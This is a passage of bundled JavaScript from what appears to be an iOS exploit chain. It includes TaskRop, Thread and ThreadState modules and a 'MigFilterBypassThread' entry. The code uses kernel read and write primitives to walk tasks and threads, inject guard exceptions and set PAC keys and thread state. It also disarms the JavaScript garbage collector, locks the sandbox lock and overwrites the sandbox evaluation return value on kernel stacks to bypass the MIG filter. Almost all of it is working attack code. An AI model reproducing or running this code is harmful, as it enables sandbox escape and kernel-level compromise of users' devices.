(!prevTask || prevTask === currTask)\n\t\t\t\tbreak;\n\t\t\tcurrTask = prevTask;\n\t\t}\n\t\treturn 0n;\n\t}\n\n\tstatic #kallocArrayDecodeAddr(ptr)\n\t{\n\t\tlet zone_mask = BigInt(1) << BigInt(this.KALLOC_ARRAY_TYPE_SHIFT);\n\t\tif (ptr & zone_mask)\n\t\t{\n\t\t\tptr &= ~0x1fn;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tptr &= ~libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].PAGE_MASK;\n\t\t\t//console.log(TAG,`ptr:${Utils.hex(ptr)}`);\n\t\t\tptr |= zone_mask;\n\t\t\t//console.log(TAG,`ptr2:${Utils.hex(ptr)}`);\n\t\t}\n\t\treturn ptr;\n\t}\n\n\tstatic getPortAddr(port)\n\t{\n\t\tif (!port)\n\t\t\treturn 0;\n\t\tlet spaceTable = this.#getSpaceTable(this.gSelfTask.addr);\n\t\treturn this.#getPortObject(spaceTable, port);\n\t}\n\n\tstatic getPortKObject(port)\n\t{\n\t\tlet portObject = this.getPortAddr(port);\n\t\treturn this.#getPortKObjectByAddr(portObject);\n\t}\n\n\tstatic #getPortKObjectByAddr(portObject)\n\t{\n\t\tif (!portObject)\n\t\t\treturn 0;\n\t\tlet kobject = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(portObject + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().objectKObject);\n\t\treturn libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].strip(kobject);\n\t}\n\n\tstatic firstThread(taskAddr)\n\t{\n\t\tlet first = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().threads);\n\t\treturn first;\n\t}\n\n\tstatic getMap(taskAddr)\n\t{\n\t\tlet vmMap = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().mapTask);\n\t\treturn vmMap;\n\t}\n\n\tstatic getPortKObjectOfTask(taskAddr,port)\n\t{\n\t\tlet portObject = this.getPortAddrOfTask(taskAddr, port);\n\t\treturn this.#getPortKObjectByAddr(portObject);\n\t}\n\n\tstatic getPortAddrOfTask(taskAddr, port)\n\t{\n\t\tlet spaceTable = this.#getSpaceTable(taskAddr);\n\t\treturn this.#getPortObject(spaceTable, port);\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/TaskRop/TaskRop.js\":\n/*!*************************************!*\\\n  !*** ./src/libs/TaskRop/TaskRop.js ***!\n  \\*************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ TaskRop)\n/* harmony export */ });\n/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Chain */ \"./src/libs/Chain/Chain.js\");\n/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ \"./src/libs/JSUtils/Utils.js\");\n/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./Task */ \"./src/libs/TaskRop/Task.js\");\n\n\n\n\nconst TAG = \"TASKROP\"\n\nclass TaskRop\n{\n\tstatic init()\n\t{\n\t\tlet selfTaskAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].getSelfTaskAddr();\n\t\tif (!selfTaskAddr)\n\t\t{\n\t\t\tconsole.log(TAG,`Unable to find self task address`);\n\t\t\treturn;\n\t\t}\t\n\t\tconsole.log(TAG,`selfTaskAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(selfTaskAddr)}`);\n\t\t_Task__WEBPACK_IMPORTED_MODULE_2__[\"default\"].init(selfTaskAddr);\n\t}\n}\n\n/***/ }),\n\n/***/ \"./src/libs/TaskRop/Thread.js\":\n/*!************************************!*\\\n  !*** ./src/libs/TaskRop/Thread.js ***!\n  \\************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Thread)\n/* harmony export */ });\n/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Chain */ \"./src/libs/Chain/Chain.js\");\n/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ \"./src/libs/JSUtils/Utils.js\");\n/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./ThreadState */ \"./src/libs/TaskRop/ThreadState.js\");\n/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/Chain/Native */ \"./src/libs/Chain/Native.js\");\n\n\n\n\n\nconst AST_GUARD = 0x1000;\nconst TAG = \"THREAD\";\n\nclass Thread\n{\n\tstatic getTro(thread)\n\t{\n\t\tlet tro = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().tro);\n\t\t// Ignore threads with invalid tro address.\n\t\tif (!(tro & 0xf000000000000000n))\n\t\t{\n\t\t\t//console.log(TAG,`Got invalid tro of thread:${Utils.hex(thread)} and value:${Utils.hex(tro)}`);\n\t\t\treturn 0n;\n\t\t}\n\t\treturn tro;\n\t}\n\tstatic getCtid(thread)\n\t{\n\t\tlet ctid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ctid);\n\t\treturn ctid;\n\t}\n\tstatic getTask(thread)\n\t{\n\t\tlet tro = this.getTro(thread);\n\t\t// Ignore threads with invalid tro address.\n\t\tif (!(tro & 0xf000000000000000n) || tro === 0n)\n\t\t\treturn 0n;\n\t\tlet task = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(tro + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().troTask);\n\t\treturn task;\n\t}\n\tstatic next(thread)\n\t{\n\t\tif (libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].strip(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().taskThreads) < 0xffffffd000000000n)\n\t\t\treturn 0;\n\t\tlet next = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().taskThreads);\n\t\tif (next < 0xffffffd000000000n)\n\t\t\treturn 0;\n\t\treturn next;\n\t}\n\tstatic setMutex(thread,ctid)\n\t{\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().mutexData, ctid);\n\t}\n\tstatic getMutex(thread)\n\t{\n\t\tlet mutex = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().mutexData);\n\t\treturn mutex;\n\t}\n\tstatic getStack(thread)\n\t{\n\t\tlet stackptr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().kstackptr);\n\t\treturn stackptr;\n\t}\n\tstatic injectGuardException(thread,code)\n\t{\n\t\tif(!this.getTro(thread))\n\t\t{\n\t\t\tconsole.log(TAG,`got invalid tro of thread, not injecting exception since thread is dead`);\n\t\t\treturn false;\n\t\t}\n\n\t\t// 18.4+\n\t\tif (xnuVersion.major == 24 && xnuVersion.minor >= 4) {\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode, 0x17n);\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode + 0x8n, code);\n\t\t}\n\t\telse {\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode, code);\n\t\t}\n\n\t\tlet ast = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ast);\n\t\tast |= AST_GUARD;\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ast, ast);\n\t\treturn true;\n\t}\n\tstatic clearGuardException(thread)\n\t{\n\t\tif(!this.getTro(thread))\n\t\t{\n\t\t\tconsole.log(TAG,`got invalid tro of thread, still clearing exception to avoid crash`);\n\t\t}\n\t\tlet ast = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ast);\n\t\tast &= ~AST_GUARD | 0x80000000;\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ast, ast);\n\n\t\t// 18.4+\n\t\tif (xnuVersion.major == 24 && xnuVersion.minor >= 4) {\n\t\t\tif (libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode) == 0x17n) {\n\t\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode, 0n);\n\t\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode + 0x8n, 0n);\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode, 0n);\n\t\t}\n\t}\n\tstatic getOptions(thread)\n\t{\n\t\tlet options = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read16(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().options);\n\t\treturn options;\n\t}\n\tstatic setOptions(thread, options)\n\t{\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write16(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().options, options);\n\t}\n\tstatic getRopPid(thread)\n\t{\n\t\tlet ropPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ropPid);\n\t\treturn ropPid;\n\t}\n\tstatic getJopPid(thread)\n\t{\n\t\tlet jopPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().jopPid);\n\t\treturn jopPid;\n\t}\n\tstatic setPACKeys(thread, keyA, keyB)\n\t{\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ropPid, keyA);\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().jopPid, keyB);\n\t}\n\n\tstatic getState(machThread)\n\t{\n\t\tlet statePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].mem;\n\t\tlet stateCountPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].mem + 0x200n;\n\t\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].write32(stateCountPtr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].ARM_THREAD_STATE64_COUNT);\n\t\tlet kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].callSymbol(\"thread_get_state\",\n\t\t\tmachThread,\n\t\t\tlibs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].ARM_THREAD_STATE64,\n\t\t\tstatePtr,\n\t\t\tstateCountPtr);\n\t\tif (kr != 0) {\n\t\t\tconsole.log(TAG, \"Unable to read thread state\");\n\t\t\treturn false;\n\t\t}\n\n\t\tlet stateBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].read(statePtr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].ARM_THREAD_STATE64_SIZE);\n\t\tlet state = new _ThreadState__WEBPACK_IMPORTED_MODULE_2__[\"default\"](stateBuff);\n\t\treturn state;\n\t}\n\n\tstatic setState(machThread, threadAddr, state)\n\t{\n\t\tlet options = 0;\n\t\tif (threadAddr) {\n\t\t\toptions = Thread.getOptions(threadAddr);\n\t\t\toptions |= 0x8000;\n\t\t\tThread.setOptions(threadAddr, options);\n\t\t}\n\n\t\tlet statePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].mem;\n\t\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].write(statePtr, state.buffer);\n\t\t//console.log(TAG,`thread:${Utils.hex(thread)}`);\n\t\tlet kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].callSymbol(\"thread_set_state\",\n\t\t\tmachThread,\n\t\t\tlibs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].ARM_THREAD_STATE64,\n\t\t\tstatePtr,\n\t\t\tlibs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].ARM_THREAD_STATE64_COUNT);\n\t\tif (kr != 0)\n\t\t{\n\t\t\tconsole.log(TAG,`Failed thread_set_state with error:${kr}`);\n\t\t\treturn false;\n\t\t}\n\n\t\tif (threadAddr) {\n\t\t\toptions &= ~0x8000;\n\t\t\tThread.setOptions(threadAddr, options);\n\t\t}\n\t\treturn true;\n\t}\n\n\tstatic resume(machThread)\n\t{\n\t\tlet kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].callSymbol(\"thread_resume\", machThread);\n\t\tif (kr != 0) {\n\t\t\tconsole.log(TAG, \"Unable to resume suspended thread\");\n\t\t\treturn false;\n\t\t}\n\t\treturn true;\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/TaskRop/ThreadState.js\":\n/*!*****************************************!*\\\n  !*** ./src/libs/TaskRop/ThreadState.js ***!\n  \\*****************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ ThreadState)\n/* harmony export */ });\n/* harmony import */ var _RegistersStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./RegistersStruct */ \"./src/libs/TaskRop/RegistersStruct.js\");\n\n\nclass ThreadState\n{\n\t#buffer;\n\t#dataView;\n\tconstructor(buffer, offset = 0)\n\t{\n\t\tthis.#buffer = buffer;\n\t\tthis.#dataView = new DataView(buffer,offset);\n\t\tthis.registers = new _RegistersStruct__WEBPACK_IMPORTED_MODULE_0__[\"default\"](buffer,offset);\n\t}\n\tget buffer()\n\t{\n\t\treturn this.#buffer;\n\t}\n\tget opaque_fp()\n\t{\n\t\treturn this.#dataView.getBigUint64(232,true);\n\t}\n\tset opaque_fp(value)\n\t{\n\t\tthis.#dataView.setBigUint64(232,value,true);\n\t}\n\tget opaque_lr()\n\t{\n\t\treturn this.#dataView.getBigUint64(240,true);\n\t}\n\tset opaque_lr(value)\n\t{\n\t\tthis.#dataView.setBigUint64(240,value,true);\n\t}\n\tget opaque_sp()\n\t{\n\t\treturn this.#dataView.getBigUint64(248,true);\n\t}\n\tset opaque_sp(value)\n\t{\n\t\tthis.#dataView.setBigUint64(248,value,true);\n\t}\n\tget opaque_pc()\n\t{\n\t\treturn this.#dataView.getBigUint64(256,true);\n\t}\n\tset opaque_pc(value)\n\t{\n\t\tthis.#dataView.setBigUint64(256,value,true);\n\t}\n\tget cpsr()\n\t{\n\t\treturn this.#dataView.getUint32(264,true);\n\t}\n\tset cpsr(value)\n\t{\n\t\tthis.#dataView.setUint32(264,value,true);\n\t}\n\tget opaque_flags()\n\t{\n\t\treturn this.#dataView.getUint32(268,true);\n\t}\n\tset opaque_flags(value)\n\t{\n\t\tthis.#dataView.setUint32(268,value,true);\n\t}\n}\n\n/***/ })\n\n/******/ \t});\n/************************************************************************/\n/******/ \t// The module cache\n/******/ \tvar __webpack_module_cache__ = {};\n/******/ \t\n/******/ \t// The require function\n/******/ \tfunction __webpack_require__(moduleId) {\n/******/ \t\t// Check if module is in cache\n/******/ \t\tvar cachedModule = __webpack_module_cache__[moduleId];\n/******/ \t\tif (cachedModule !== undefined) {\n/******/ \t\t\treturn cachedModule.exports;\n/******/ \t\t}\n/******/ \t\t// Create a new module (and put it into the cache)\n/******/ \t\tvar module = __webpack_module_cache__[moduleId] = {\n/******/ \t\t\t// no module.id needed\n/******/ \t\t\t// no module.loaded needed\n/******/ \t\t\texports: {}\n/******/ \t\t};\n/******/ \t\n/******/ \t\t// Execute the module function\n/******/ \t\t__webpack_modules__[moduleId](module, module.exports, __webpack_require__);\n/******/ \t\n/******/ \t\t// Return the exports of the module\n/******/ \t\treturn module.exports;\n/******/ \t}\n/******/ \t\n/************************************************************************/\n/******/ \t/* webpack/runtime/define property getters */\n/******/ \t(() => {\n/******/ \t\t// define getter functions for harmony exports\n/******/ \t\t__webpack_require__.d = (exports, definition) => {\n/******/ \t\t\tfor(var key in definition) {\n/******/ \t\t\t\tif(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {\n/******/ \t\t\t\t\tObject.defineProperty(exports, key, { enumerable: true, get: definition[key] });\n/******/ \t\t\t\t}\n/******/ \t\t\t}\n/******/ \t\t};\n/******/ \t})();\n/******/ \t\n/******/ \t/* webpack/runtime/hasOwnProperty shorthand */\n/******/ \t(() => {\n/******/ \t\t__webpack_require__.o = (obj, prop) => (Object.prototype.hasOwnProperty.call(obj, prop))\n/******/ \t})();\n/******/ \t\n/******/ \t/* webpack/runtime/make namespace object */\n/******/ \t(() => {\n/******/ \t\t// define __esModule on exports\n/******/ \t\t__webpack_require__.r = (exports) => {\n/******/ \t\t\tif(typeof Symbol !== 'undefined' && Symbol.toStringTag) {\n/******/ \t\t\t\tObject.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });\n/******/ \t\t\t}\n/******/ \t\t\tObject.defineProperty(exports, '__esModule', { value: true });\n/******/ \t\t};\n/******/ \t})();\n/******/ \t\n/************************************************************************/\nvar __webpack_exports__ = {};\n// This entry needs to be wrapped in an IIFE because it needs to be isolated against other modules in the chunk.\n(() => {\n/*!**************************************!*\\\n  !*** ./src/MigFilterBypassThread.js ***!\n  \\**************************************/\n__webpack_require__.r(__webpack_exports__);\n/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Native */ \"./src/libs/Chain/Native.js\");\n/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Chain */ \"./src/libs/Chain/Chain.js\");\n/* harmony import */ var libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/TaskRop/Task */ \"./src/libs/TaskRop/Task.js\");\n/* harmony import */ var libs_TaskRop_Thread__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/TaskRop/Thread */ \"./src/libs/TaskRop/Thread.js\");\n/* harmony import */ var libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! libs/TaskRop/TaskRop */ \"./src/libs/TaskRop/TaskRop.js\");\n/* harmony import */ var libs_JSUtils_Logger__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! libs/JSUtils/Logger */ \"./src/libs/JSUtils/Logger.js\");\n/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! libs/JSUtils/Utils */ \"./src/libs/JSUtils/Utils.js\");\n/* harmony import */ var libs_Driver_DriverNewThread__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! libs/Driver/DriverNewThread */ \"./src/libs/Driver/DriverNewThread.js\");\n\n\n\n\n\n\n\n\n\nconst TAG = \"MIG_FILTER_BYPASS\";\n\nconst RUN_FLAG_STOP = 0;\nconst RUN_FLAG_RUN = 1;\nconst RUN_FLAG_PAUSE = 2;\n\nfunction disarm_gc() {\n\n\tlet vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);\n\tlet heap = vm + 0xc0n;\n\tlet m_threadGroup = uread64(heap + 0x198n);\n\tlet threads = uread64(m_threadGroup);\n\tuwrite64(threads + 0x20n, 0x0n);\n\t// LOG(\"[+] gc disarmed\");\n}\n\nfunction kstrip(addr) {\n\treturn addr | 0xffffff8000000000n;\n}\n\nfunction lockSandboxLock() {\n\t// Find \"_duplicate_lock\" address, which is a \"lck_rw_t\"\n\tconst lockAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].getKernelBase() + migLock;\n\tconst sbxMessageAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].getKernelBase() + migSbxMsg;\n\n\t//console.log(TAG, \"kernelSlide: \" + Utils.hex(kernelSlide));\n\t//console.log(TAG, \"lockAddr: \" + Utils.hex(lockAddr));\n\t//console.log(TAG, \"sbxMessageAddr: \" + Utils.hex(sbxMessageAddr));\n\n\tlet lockBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].readBuff(lockAddr, 16);\n\tlet lockBuff32 = new Uint32Array(lockBuff);\n\t//for (let i=0, j=0; i<16; i+=4, j++)\n\t//\tconsole.log(TAG, `${Utils.hex(i)}: ${Utils.hex(lockBuff32[j]).padStart(8, '0')}`);\n\n\tlet lockData = lockBuff32[2];\n\tlockData |= 0x410000;\t// interlock + can_sleep\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].write32(lockAddr + 0x8n, lockData);\n\n\t// Do we need to clear this addr while locking too? Or maybe just when we unlock is enough?\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].write64(sbxMessageAddr, 0n);\n}\n\nfunction unlockSandboxLock() {\n\tconst lockAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].getKernelBase() + migLock;\n\tconst sbxMessageAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].getKernelBase() + migSbxMsg;\n\n\t\n\t// clear the sbx message buffer (pointer) used to check for duplicate messages.\n\t// This should solve an issue with sfree() if we unlock and lock sandbox quick enough.\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].write64(sbxMessageAddr, 0n);\n\n\tlet lockBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].readBuff(lockAddr, 16);\n\tlet lockBuff32 = new Uint32Array(lockBuff);\n\n\tlet lockData = lockBuff32[2];\n\tlockData &= ~0x10000;\t// interlock\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].write32(lockAddr + 0x8n, lockData);\n}\n\nfunction dumpKMem(addr, size) {\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].read(addr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].mem, size);\n\tlet buff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].mem, size);\n\tlet buff64 = new BigUint64Array(buff);\n\tfor (let i=0, j=0; i<size; i+=8, j++) {\n\t\tlet bits = buff64[j] & 0xfffn;\n\t\tif (bits === 0x4a4n)\n\t\t\tconsole.log(TAG, `[${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(addr + BigInt(i))}] ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(i)}: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(buff64[j]).padStart(16, '0')} <<< FOUND ?`);\n\t\telse\n\t\t\tconsole.log(TAG, `[${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(addr + BigInt(i))}] ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(i)}: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(buff64[j]).padStart(16, '0')}`);\n\t}\n}\n\nfunction findReturnValueOffs(addr) {\n\t// Read from thread kstack, page aligned\n\tconst READ_SIZE = 0x1000;\n\t//Chain.read(addr, Native.mem, READ_SIZE);\n\tlet pageAddr = libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_2__[\"default\"].trunc_page(addr);\n\tlet startAddr = pageAddr + 0x3000n;\n\tlet buff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].readBuff(startAddr, READ_SIZE);\n\tif (!buff)\n\t\treturn false;\n\tlet buff64 = new BigUint64Array(buff);\n\tlet expectedLR = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].getKernelBase() + migKernelStackLR;\n\n\t// Look for 0xxxxxxxxxxxxxx4a4 value, which should be the LSB of LR pointing to Sandbox.kext inside\n\t// \"_sb_evaluate_internal()\", so meaning we found the function stack we need (_sb_eval).\n\tfor (let i=0, j=0; i<READ_SIZE; i+=8, j++) {\n\t\tlet val = kstrip(buff64[j]);\n\t\tif (val === expectedLR) {\n\t\t\t//console.log(TAG, `Matching LR found at ${Utils.hex(startAddr + BigInt(i))}: ${Utils.hex(buff64[j])}`);\n\n\t\t\t// The return value of _eval() is stored in the stack at -40 bytes from LR.\n\t\t\tlet offs = startAddr + BigInt(i - 40);\n\t\t\treturn offs;\n\t\t}\n\t}\n\treturn false;\n}\n\nfunction disableFilterOnThread(threadAddr) {\n\t//console.log(TAG, \"Read kstack of thread: \" + Utils.hex(threadAddr));\n\tlet kstack = libs_TaskRop_Thread__WEBPACK_IMPORTED_MODULE_3__[\"default\"].getStack(threadAddr);\n\tif (!kstack)\n\t\treturn false;\n\n\tkstack = kstrip(kstack);\n\tlet kernelSPOffset = BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].UINT64_SIZE * 12);\n\tlet kernelSP = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].read64(kstack + kernelSPOffset);\n\tif (!kernelSP)\n\t\treturn false;\n\n\t//console.log(TAG, \"kstack:   \" + Utils.hex(kstack));\n\t//console.log(TAG, \"kernelSP: \" + Utils.hex(kernelSP));\n\n\t//dumpKMem(kstack, 0x70);\n\t//dumpKMem(kernelSP, 0x1000);\n\n\t//console.log(TAG, \"Possible MIG syscall with thread: \" + Utils.hex(threadAddr));\n\n\tlet offs = findReturnValueOffs(kernelSP);\n\tif (!offs) {\n\t\t//console.log(TAG, \"Unable to find offset\");\n\t\treturn false;\n\t}\n\n\t//console.log(TAG, \"Offs found at: \" + Utils.hex(offs));\n\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].write64(offs, 0n);\n\n\tconsole.log(TAG, \"MIG syscall intercepted for thread: \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(threadAddr));\n\n\treturn true;\n}\n\nfunction waitForMigSyscall(selfTaskAddr, runBypassFlagPtr, timeout=5000) {\n\t//console.log(TAG, \"Wait for MIG syscall...\");\n\tlet startTimestamp = Date.now();\n\n\twhile (true) {\n\t\tlet runBypassFlag = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(runBypassFlagPtr);\n\t\tif (!runBypassFlag)\n\t\t\treturn RUN_FLAG_STOP;\n\t\tif (runBypassFlag == 